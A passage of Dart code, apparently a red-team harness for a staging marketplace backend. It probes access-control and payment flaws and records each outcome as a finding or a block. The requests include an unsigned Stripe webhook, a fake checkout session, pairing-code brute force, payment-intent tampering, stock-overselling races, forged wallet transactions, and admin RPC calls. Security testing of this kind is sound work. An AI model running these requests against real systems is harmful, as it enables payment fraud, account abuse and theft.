      title: 'Buyer cria chat entre dois IDs alheios',
      actor: 'buyer JWT',
      result: httpSnap(chatIns),
    );
  } else {
    noteBlocked('PRIV-08', 'chat third party', httpSnap(chatIns));
  }

  cycles['4_privacy'] = 'done';
}

Future<void> _cycleEdges(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
  Map<String, String> env,
) async {
  cycles['5_edges'] = 'start';

  final refundBuyer = await edge(
    c,
    'refund-order',
    token: buyerTok,
    body: {'order_id': '00000000-0000-0000-0000-000000000001'},
  );
  evidence['refund_as_buyer'] = httpSnap(refundBuyer);
  if (refundBuyer.statusCode == 200 &&
      refundBuyer.body.contains('"ok":true') &&
      !refundBuyer.body.contains('skipped')) {
    noteFinding(
      id: 'RTB-B-EDGE-01',
      severity: 'P0',
      title: 'Buyer invoca refund-order com sucesso',
      actor: 'buyer JWT',
      result: httpSnap(refundBuyer),
    );
  } else {
    noteBlocked('EDGE-01', 'refund-order buyer', httpSnap(refundBuyer));
  }

  final muxBuyer = await edge(
    c,
    'create-mux-live',
    token: buyerTok,
    body: {'title': '$tag mux hijack'},
  );
  evidence['mux_buyer'] = httpSnap(muxBuyer);
  if (muxBuyer.statusCode == 200 && muxBuyer.body.contains('stream')) {
    noteFinding(
      id: 'RTB-B-EDGE-02',
      severity: 'P1',
      title: 'Buyer cria live Mux (quota/custo)',
      actor: 'buyer JWT',
      result: httpSnap(muxBuyer),
    );
  } else {
    noteBlocked('EDGE-02', 'mux buyer', httpSnap(muxBuyer));
  }

  // livekit token for a live not owned
  final lives = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/lives?select=id,seller_id,vendedor_id&limit=5',
    service: true,
  );
  String? otherLive;
  if (lives.statusCode == 200) {
    try {
      for (final row in jsonDecode(lives.body) as List) {
        final m = row as Map;
        final sid = (m['seller_id'] ?? m['vendedor_id'])?.toString();
        if (sid != null && sid != buyerId) {
          otherLive = m['id']?.toString();
          break;
        }
      }
    } catch (_) {}
  }
  if (otherLive != null) {
    final lk = await edge(
      c,
      'livekit-mux-publish',
      token: buyerTok,
      body: {'step': 'token', 'live_id': otherLive},
    );
    evidence['livekit_other_live'] = httpSnap(lk);
    if (lk.statusCode == 200 && lk.body.contains('token')) {
      noteFinding(
        id: 'RTB-B-EDGE-03',
        severity: 'P1',
        title: 'Buyer obtém token LiveKit publisher de live alheia',
        actor: 'buyer JWT',
        request: 'livekit-mux-publish step=token live_id=$otherLive',
        result: httpSnap(lk),
      );
    } else {
      noteBlocked('EDGE-03', 'livekit other live', httpSnap(lk));
    }
  }

  final wh = await edge(
    c,
    'stripe-webhook',
    token: c.anonKey,
    body: {'type': 'checkout.session.completed'},
  );
  evidence['webhook_unsigned'] = httpSnap(wh);
  if (wh.statusCode == 200) {
    noteFinding(
      id: 'RTB-B-EDGE-04',
      severity: 'P0',
      title: 'stripe-webhook aceita POST sem assinatura',
      actor: 'anon',
      result: httpSnap(wh),
    );
  } else {
    noteBlocked('EDGE-04', 'webhook unsigned', httpSnap(wh));
  }

  final settle = await edge(
    c,
    'create-payment-intent',
    token: c.anonKey,
    method: 'GET',
    query: '?checkout_return=success&session_id=cs_test_fake_$stamp',
  );
  evidence['settle_fake_session'] = httpSnap(settle);
  if (settle.statusCode == 200 &&
      (settle.body.contains('pago') || settle.body.contains('settled'))) {
    noteFinding(
      id: 'RTB-B-EDGE-05',
      severity: 'P0',
      title: 'GET settle com session_id falso marca pago',
      actor: 'anon',
      result: httpSnap(settle),
    );
  } else {
    noteBlocked('EDGE-05', 'fake session settle', httpSnap(settle));
  }

  // PS pairing unauthenticated + device_id rotation (rate-limit key)
  final claimA = await edge(
    c,
    'ps-pairing-claim',
    token: c.anonKey,
    body: {'code': '000000', 'device_id': 'rtbb-dev-a'},
  );
  final claimB = await edge(
    c,
    'ps-pairing-claim',
    token: c.anonKey,
    body: {'code': '000001', 'device_id': 'rtbb-dev-b'},
  );
  evidence['ps_claim'] = {'a': httpSnap(claimA), 'b': httpSnap(claimB)};
  if (claimA.statusCode == 200 && claimA.body.contains('device_token')) {
    noteFinding(
      id: 'RTB-B-EDGE-06',
      severity: 'P1',
      title: 'ps-pairing-claim sem auth devolve device_token',
      actor: 'anon',
      result: httpSnap(claimA),
    );
  } else {
    noteBlocked('EDGE-06', 'ps claim dummy code', httpSnap(claimA));
  }

  // Demonstrate rate-limit is per attacker-controlled device_id (small burst)
  var limited = 0;
  var acceptedShape = 0;
  for (var i = 0; i < 8; i++) {
    final r = await edge(
      c,
      'ps-pairing-claim',
      token: c.anonKey,
      body: {
        'code': (100000 + i).toString(),
        'device_id': 'rtbb-rot-$i-$stamp',
      },
    );
    if (r.body.contains('rate_limited')) limited++;
    if (r.statusCode == 400 || r.body.contains('invalid_or_expired')) {
      acceptedShape++;
    }
  }
  evidence['ps_claim_rotate'] = {'limited': limited, 'invalid_ok': acceptedShape};
  if (limited == 0 && acceptedShape >= 6) {
    noteFinding(
      id: 'RTB-B-EDGE-07',
      severity: 'P2',
      title:
          'ps-pairing-claim rate-limit keyed em device_id controlado pelo atacante',
      actor: 'anon',
      result: evidence['ps_claim_rotate'],
      impact:
          'Espaço de códigos 6 dígitos + rotação de device_id permite brute-force do pairing (token OCR).',
    );
  }

  final e2e = await edge(
    c,
    'sec-fase2-e2e-oversell',
    token: buyerTok,
    body: {'probe': '1'},
  );
  evidence['e2e_oversell_jwt'] = httpSnap(e2e);
  if (e2e.statusCode == 200 && e2e.body.contains('"ok":true')) {
    noteFinding(
      id: 'RTB-B-EDGE-08',
      severity: 'P1',
      title: 'sec-fase2-e2e-oversell executável com JWT buyer',
      actor: 'buyer JWT',
      result: httpSnap(e2e),
    );
  } else {
    noteBlocked('EDGE-08', 'e2e oversell jwt', httpSnap(e2e));
  }

  final ingest = await edge(
    c,
    'ingest-ocr-reservation',
    token: c.anonKey,
    extraHeaders: {'x-device-token': 'garbage'},
    body: {
      'live_id': '00000000-0000-0000-0000-000000000003',
      'ocr_line_hash': 'abcdefghijkl',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    },
  );
  evidence['ocr_garbage_token'] = httpSnap(ingest);
  if (ingest.statusCode == 200 && ingest.body.contains('"ok":true')) {
    noteFinding(
      id: 'RTB-B-EDGE-09',
      severity: 'P1',
      title: 'OCR ingest aceita token lixo',
      actor: 'anon',
      result: httpSnap(ingest),
    );
  } else {
    noteBlocked('EDGE-09', 'ocr garbage token', httpSnap(ingest));
  }

  // Payment intent payload mutation
  final pi = await edge(
    c,
    'create-payment-intent',
    token: buyerTok,
    body: {
      'amount': 1,
      'buyer_id': sellerId,
      'seller_id': buyerId,
      'quantity': -1,
      'item_price': 0.01,
      'shipping_method': 'hand',
      'bag_checkout': true,
      'bag_lines': [
        {
          'order_id': '00000000-0000-0000-0000-000000000004',
          'line_total_cents': 1,
          'quantity': 99,
        }
      ],
    },
  );
  evidence['pi_mutation'] = httpSnap(pi);
  if (pi.statusCode == 200 && pi.body.contains('checkoutUrl')) {
    noteFinding(
      id: 'RTB-B-EDGE-10',
      severity: 'P1',
      title: 'create-payment-intent aceita bag/amount hostil e cria checkout',
      actor: 'buyer JWT',
      result: httpSnap(pi),
    );
  } else {
    noteBlocked('EDGE-10', 'pi mutation', httpSnap(pi));
  }

  cycles['5_edges'] = 'done';
}

Future<void> _cycleCollusionStock(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['6_collusion_stock'] = 'start';
  final prod = await _ensureProduct(c, sellerTok, sellerId);
  if (prod == null) {
    cycles['6_collusion_stock'] = 'no_product';
    return;
  }
  final pid = prod['id'].toString();

  // Reset qty=1
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/products?id=eq.$pid',
    service: true,
    body: {'quantity': 1, 'is_sold': false},
  );

  // Path A: marketplace order, seller marks pago (off-platform)
  final ord = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'quantity': 1,
      'price': 7.5,
      'price_total': 7.5,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
    },
  );
  String? oid;
  if (ord.statusCode < 300) {
    final d = jsonDecode(ord.body);
    final row = d is List ? d.first : d;
    oid = (row as Map)['id']?.toString();
  }
  evidence['collusion_order'] = httpSnap(ord);

  if (oid != null) {
    // seller accept then pago
    await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': 'reservado'},
    );
    final pago = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': 'pago'},
    );
    final prodAfter = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/products?id=eq.$pid&select=id,quantity,is_sold',
      service: true,
    );
    evidence['collusion_seller_pago'] = {
      'pago': httpSnap(pago),
      'product': _clip(prodAfter.body),
    };

    // Path B: second order same product qty=1
    final ord2 = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/orders',
      token: buyerTok,
      body: {
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'product_id': pid,
        'quantity': 1,
        'price': 7.5,
        'price_total': 7.5,
        'status': 'reserva_pendente',
        'payment_method': 'MB WAY',
      },
    );
    String? oid2;
    if (ord2.statusCode < 300) {
      final d = jsonDecode(ord2.body);
      final row = d is List ? d.first : d;
      oid2 = (row as Map)['id']?.toString();
    }
    String? st2;
    if (oid2 != null) {
      await rest(
        c,
        method: 'PATCH',
        path: '/rest/v1/orders?id=eq.$oid2',
        token: sellerTok,
        body: {'status': 'reservado'},
      );
      final pago2 = await rest(
        c,
        method: 'PATCH',
        path: '/rest/v1/orders?id=eq.$oid2',
        token: sellerTok,
        body: {'status': 'pago'},
      );
      evidence['second_pago'] = httpSnap(pago2);
      final read2 = await rest(
        c,
        method: 'GET',
        path: '/rest/v1/orders?id=eq.$oid2&select=id,status,stock_units_applied',
        service: true,
      );
      st2 = read2.body;
    }
    final prodFinal = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/products?id=eq.$pid&select=id,quantity,is_sold',
      service: true,
    );
    evidence['dual_pago_product'] = _clip(prodFinal.body);
    evidence['dual_order2_status'] = st2;

    var qty = -999;
    try {
      final p = jsonDecode(prodFinal.body);
      final row = p is List ? p.first : p;
      qty = int.tryParse('${(row as Map)['quantity']}') ?? -999;
    } catch (_) {}

    final o1 = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.$oid&select=id,status,stock_units_applied',
      service: true,
    );
    var bothPago = o1.body.contains('"pago"') && (st2 ?? '').contains('"pago"');
    if (bothPago && qty < 0) {
      noteFinding(
        id: 'RTB-B-STOCK-01',
        severity: 'P1',
        title: 'Duas orders pago no mesmo produto stock=1 (qty negativa ou dupla)',
        actor: 'buyer+seller collusion',
        before: {'quantity': 1},
        result: {
          'order1': _clip(o1.body),
          'order2': st2,
          'product': _clip(prodFinal.body),
        },
        after: {'quantity': qty},
        impact: 'Oversell: duas vendas válidas sobre 1 unidade.',
      );
    } else if (bothPago) {
      noteFinding(
        id: 'RTB-B-STOCK-02',
        severity: 'P2',
        title: 'Duas orders status=pago no mesmo produto stock=1 (qty final=$qty)',
        actor: 'buyer+seller collusion',
        result: {
          'order1': _clip(o1.body),
          'order2': st2,
          'product': _clip(prodFinal.body),
        },
        impact:
            'Estados pago duplicados; impacto económico depende de stock_units_applied e wallet.',
      );
    } else {
      noteBlocked('STOCK-01', 'dual pago blocked or second not pago', {
        'o1': _clip(o1.body),
        'o2': st2,
        'qty': qty,
      });
    }

    if (oid2 != null) {
      await rest(
        c,
        method: 'DELETE',
        path: '/rest/v1/orders?id=eq.$oid2',
        service: true,
      );
    }
    await rest(
      c,
      method: 'DELETE',
      path: '/rest/v1/orders?id=eq.$oid',
      service: true,
    );
  }

  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/products?id=eq.$pid',
    service: true,
    body: {'quantity': 1, 'is_sold': false},
  );
  cycles['6_collusion_stock'] = 'done';
}

Future<void> _cycleRaces(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['7_races'] = 'start';
  final prod = await _ensureProduct(c, sellerTok, sellerId);
  if (prod == null) {
    cycles['7_races'] = 'no_product';
    return;
  }
  final pid = prod['id'].toString();

  // Parallel INSERT two orders then parallel seller→pago
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/products?id=eq.$pid',
    service: true,
    body: {'quantity': 1, 'is_sold': false},
  );

  Future<http.Response> mk() => rest(
        c,
        method: 'POST',
        path: '/rest/v1/orders',
        token: buyerTok,
        body: {
          'buyer_id': buyerId,
          'seller_id': sellerId,
          'product_id': pid,
          'quantity': 1,
          'price': 7.5,
          'price_total': 7.5,
          'status': 'reserva_pendente',
          'payment_method': 'MB WAY',
        },
      );
  final created = await Future.wait(List.generate(8, (_) => mk()));
  final ids = <String>[];
  for (final r in created) {
    if (r.statusCode >= 300) continue;
    try {
      final d = jsonDecode(r.body);
      final row = d is List ? d.first : d;
      final id = (row as Map)['id']?.toString();
      if (id != null) ids.add(id);
    } catch (_) {}
  }
  evidence['race_insert_n'] = ids.length;

  for (final id in ids) {
    await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$id',
      token: sellerTok,
      body: {'status': 'reservado'},
    );
  }
  final pagos = await Future.wait(ids.map((id) => rest(
        c,
        method: 'PATCH',
        path: '/rest/v1/orders?id=eq.$id',
        token: sellerTok,
        body: {'status': 'pago'},
      )));
  final paidIds = <String>[];
  for (var i = 0; i < ids.length; i++) {
    final read = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/orders?id=eq.${ids[i]}&select=id,status,stock_units_applied',
      service: true,
    );
    if (read.body.contains('"pago"')) paidIds.add(ids[i]);
  }
  final prodAfter = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/products?id=eq.$pid&select=id,quantity,is_sold',
    service: true,
  );
  var qty = 1;
  try {
    final p = jsonDecode(prodAfter.body);
    final row = p is List ? p.first : p;
    qty = int.tryParse('${(row as Map)['quantity']}') ?? 1;
  } catch (_) {}
  races.add({
    'name': 'parallel_seller_pago_qty1',
    'created': ids.length,
    'paid': paidIds.length,
    'product_qty': qty,
    'product': _clip(prodAfter.body),
  });
  if (paidIds.length >= 2) {
    noteFinding(
      id: 'RTB-B-RACE-01',
      severity: qty < 0 || paidIds.length > 1 ? 'P1' : 'P2',
      title:
          'Race: ${paidIds.length} orders pago em paralelo sobre produto stock=1 (qty=$qty)',
      actor: 'seller JWT burst',
      result: races.last,
      impact: 'Check-then-act no trigger de stock sob concorrência.',
    );
  } else {
    noteBlocked('RACE-01', 'parallel pago', races.last);
  }

  for (final id in ids) {
    await rest(
      c,
      method: 'DELETE',
      path: '/rest/v1/orders?id=eq.$id',
      service: true,
    );
  }
  await rest(
    c,
    method: 'PATCH',
    path: '/rest/v1/products?id=eq.$pid',
    service: true,
    body: {'quantity': 1, 'is_sold': false},
  );

  // Tip pending + apply (if grant leaked)
  cycles['7_races'] = 'done';
}

Future<void> _cycleReviewsDisputesTips(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['8_reviews_disputes'] = 'start';

  final rev = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/reviews',
    token: buyerTok,
    body: {
      'author_id': buyerId,
      'target_id': sellerId,
      'rating': 5,
      'comment': '$tag fake review',
      'order_id': '00000000-0000-0000-0000-000000000010',
    },
  );
  evidence['review_no_order'] = httpSnap(rev);
  if (rev.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-REP-01',
      severity: 'P1',
      title: 'INSERT review sem order real',
      actor: 'buyer JWT',
      result: httpSnap(rev),
    );
    try {
      final d = jsonDecode(rev.body);
      final row = d is List ? d.first : d;
      final id = (row as Map)['id']?.toString();
      if (id != null) {
        await rest(
          c,
          method: 'DELETE',
          path: '/rest/v1/reviews?id=eq.$id',
          service: true,
        );
      }
    } catch (_) {}
  } else {
    noteBlocked('REP-01', 'review no order', httpSnap(rev));
  }

  final disp = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/order_disputes',
    token: buyerTok,
    body: {
      'order_id': '00000000-0000-0000-0000-000000000010',
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'status': 'aberta',
    },
  );
  evidence['dispute_fake_order'] = httpSnap(disp);
  if (disp.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-REP-02',
      severity: 'P1',
      title: 'INSERT dispute para order inexistente',
      actor: 'buyer JWT',
      result: httpSnap(disp),
    );
  } else {
    noteBlocked('REP-02', 'dispute fake order', httpSnap(disp));
  }

  final part = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_process_partial_refund_dispute',
    token: buyerTok,
    body: {
      'p_order_id': '00000000-0000-0000-0000-000000000010',
      'p_refund_percent': 100,
    },
  );
  evidence['partial_refund_no_order'] = httpSnap(part);
  if (part.statusCode == 200 && part.body.contains('true')) {
    noteFinding(
      id: 'RTB-B-FIN-07',
      severity: 'P0',
      title: 'partial_refund_dispute com order fake + 100%',
      actor: 'buyer JWT',
      result: httpSnap(part),
    );
  } else {
    noteBlocked('FIN-07', 'partial refund fake', httpSnap(part));
  }

  // live_tips INSERT completed
  final tipIns = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/live_tips',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'amount': 50,
      'seller_amount': 50,
      'status': 'completed',
      'payment_source': 'wallet',
    },
  );
  evidence['tip_insert_completed'] = httpSnap(tipIns);
  if (tipIns.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-FIN-08',
      severity: 'P1',
      title: 'JWT INSERT live_tips completed (atalho ao settle)',
      actor: 'buyer JWT',
      result: httpSnap(tipIns),
      impact: 'Pode não creditar wallet sozinho; estado reputacional/contábil falso.',
    );
    try {
      final d = jsonDecode(tipIns.body);
      final row = d is List ? d.first : d;
      final id = (row as Map)['id']?.toString();
      if (id != null) {
        await rest(
          c,
          method: 'DELETE',
          path: '/rest/v1/live_tips?id=eq.$id',
          service: true,
        );
      }
    } catch (_) {}
  } else {
    noteBlocked('FIN-08', 'tip insert completed', httpSnap(tipIns));
  }

  // Admin list
  final adm = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_admin_list_profiles',
    token: buyerTok,
    body: {'p_limit': 20},
  );
  evidence['admin_list_buyer'] = httpSnap(adm);
  if (adm.statusCode == 200 && adm.body.contains(sellerId)) {
    noteFinding(
      id: 'RTB-B-ID-03',
      severity: 'P1',
      title: 'Buyer executa batata_admin_list_profiles',
      actor: 'buyer JWT',
      result: httpSnap(adm),
    );
  } else {
    noteBlocked('ID-03', 'admin list buyer', httpSnap(adm));
  }

  cycles['8_reviews_disputes'] = 'done';
}

Future<void> _cycleStaffAdminMux(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['9_staff_mux'] = 'start';

  // Helper invite confused deputy
  final help = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/seller_helpers',
    token: buyerTok,
    body: {
      'seller_id': sellerId,
      'helper_id': buyerId,
      'status': 'accepted',
      'can_manage_reservations': true,
    },
  );
  evidence['helper_self_insert'] = httpSnap(help);
  if (help.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-ID-04',
      severity: 'P1',
      title: 'Buyer INSERT seller_helpers accepted na loja alheia',
      actor: 'buyer JWT',
      result: httpSnap(help),
      impact: 'Autoridade de reservas/staff sem convite.',
    );
    try {
      final d = jsonDecode(help.body);
      final row = d is List ? d.first : d;
      final id = (row as Map)['id']?.toString();
      if (id != null) {
        await rest(
          c,
          method: 'DELETE',
          path: '/rest/v1/seller_helpers?id=eq.$id',
          service: true,
        );
      }
    } catch (_) {}
  } else {
    noteBlocked('ID-04', 'helper insert', httpSnap(help));
  }

  // complete-mux-live as buyer on others
  final lives = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/lives?select=id,seller_id,status,is_active&status=eq.live&limit=1',
    service: true,
  );
  if (lives.statusCode == 200) {
    try {
      final list = jsonDecode(lives.body) as List;
      if (list.isNotEmpty) {
        final liveId = (list.first as Map)['id']?.toString();
        final owner = (list.first as Map)['seller_id']?.toString();
        if (liveId != null && owner != buyerId) {
          final stop = await edge(
            c,
            'complete-mux-live',
            token: buyerTok,
            body: {'live_id': liveId},
          );
          evidence['complete_mux_other'] = httpSnap(stop);
          if (stop.statusCode == 200 &&
              (stop.body.contains('ok') || stop.body.contains('ended'))) {
            noteFinding(
              id: 'RTB-B-EDGE-11',
              severity: 'P1',
              title: 'Buyer termina Mux live alheia',
              actor: 'buyer JWT',
              request: 'complete-mux-live live_id=$liveId',
              result: httpSnap(stop),
            );
          } else {
            noteBlocked('EDGE-11', 'complete mux other', httpSnap(stop));
          }
        }
      }
    } catch (_) {}
  }

  final sys = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_live_system_message',
    token: buyerTok,
    body: {
      'p_live_id': '00000000-0000-0000-0000-000000000020',
      'p_body': '$tag hijack',
      'p_kind': 'system',
    },
  );
  evidence['system_message'] = httpSnap(sys);
  if (sys.statusCode == 200) {
    noteFinding(
      id: 'RTB-B-ID-05',
      severity: 'P2',
      title: 'Buyer chama batata_live_system_message',
      actor: 'buyer JWT',
      result: httpSnap(sys),
    );
  } else {
    noteBlocked('ID-05', 'system message', httpSnap(sys));
  }

  cycles['9_staff_mux'] = 'done';
}

Future<void> _cycleLastSaturation(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles['10_saturation'] = 'start';

  // Bundles write
  final bun = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/product_bundles',
    token: buyerTok,
    body: {
      'seller_id': sellerId,
      'buyer_id': buyerId,
      'status': 'accepted',
      'title': '$tag bundle',
    },
  );
  evidence['bundle_accepted'] = httpSnap(bun);
  if (bun.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-ID-06',
      severity: 'P1',
      title: 'Buyer INSERT product_bundles accepted (atalho à aceitação)',
      actor: 'buyer JWT',
      result: httpSnap(bun),
    );
    try {
      final d = jsonDecode(bun.body);
      final row = d is List ? d.first : d;
      final id = (row as Map)['id']?.toString();
      if (id != null) {
        await rest(
          c,
          method: 'DELETE',
          path: '/rest/v1/product_bundles?id=eq.$id',
          service: true,
        );
      }
    } catch (_) {}
  } else {
    noteBlocked('ID-06', 'bundle insert accepted', httpSnap(bun));
  }

  // Offers
  final off = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/product_offers',
    token: buyerTok,
    body: {
      'seller_id': sellerId,
      'buyer_id': buyerId,
      'status': 'accepted',
      'price': 1,
    },
  );
  evidence['offer_accepted'] = httpSnap(off);
  if (off.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-ID-07',
      severity: 'P1',
      title: 'Buyer INSERT product_offers accepted',
      actor: 'buyer JWT',
      result: httpSnap(off),
    );
  } else {
    noteBlocked('ID-07', 'offer insert', httpSnap(off));
  }

  // Reservation converted as buyer
  final lives = await rest(
    c,
    method: 'GET',
    path: '/rest/v1/live_items?select=id,live_id,seller_id,product_id&limit=1',
    service: true,
  );
  if (lives.statusCode == 200) {
    try {
      final list = jsonDecode(lives.body) as List;
      if (list.isNotEmpty) {
        final li = list.first as Map;
        final resIns = await rest(
          c,
          method: 'POST',
          path: '/rest/v1/live_reservation_requests',
          token: buyerTok,
          body: {
            'live_id': li['live_id'],
            'live_item_id': li['id'],
            'seller_id': li['seller_id'] ?? sellerId,
            'buyer_id': buyerId,
            'requested_qty': 1,
            'status': 'converted',
          },
        );
        evidence['res_insert_converted'] = httpSnap(resIns);
        String? rid;
        String? st;
        if (resIns.statusCode < 300) {
          final d = jsonDecode(resIns.body);
          final row = d is List ? d.first : d;
          rid = (row as Map)['id']?.toString();
          st = row['status']?.toString();
        }
        if (st == 'converted' || st == 'accepted') {
          noteFinding(
            id: 'RTB-B-STOCK-03',
            severity: 'P1',
            title: 'Buyer INSERT reservation status=$st (consome capacidade)',
            actor: 'buyer JWT',
            result: httpSnap(resIns),
          );
        } else {
          noteBlocked('STOCK-03', 'res insert converted rewritten', {
            'http': httpSnap(resIns),
            'status': st,
          });
        }
        if (rid != null) {
          await rest(
            c,
            method: 'DELETE',
            path: '/rest/v1/live_reservation_requests?id=eq.$rid',
            service: true,
          );
        }
      }
    } catch (e) {
      evidence['res_insert_err'] = e.toString();
    }
  }

  // Wallet transactions insert
  final wt = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/wallet_transactions',
    token: buyerTok,
    body: {
      'wallet_id': buyerId,
      'amount': 40,
      'type': 'reembolso',
      'description': tag,
    },
  );
  evidence['wt_insert'] = httpSnap(wt);
  if (wt.statusCode < 300) {
    noteFinding(
      id: 'RTB-B-FIN-09',
      severity: 'P1',
      title: 'JWT INSERT wallet_transactions (ledger forjado)',
      actor: 'buyer JWT',
      result: httpSnap(wt),
    );
  } else {
    noteBlocked('FIN-09', 'wt insert', httpSnap(wt));
  }

  cycles['10_saturation'] = 'done';
}
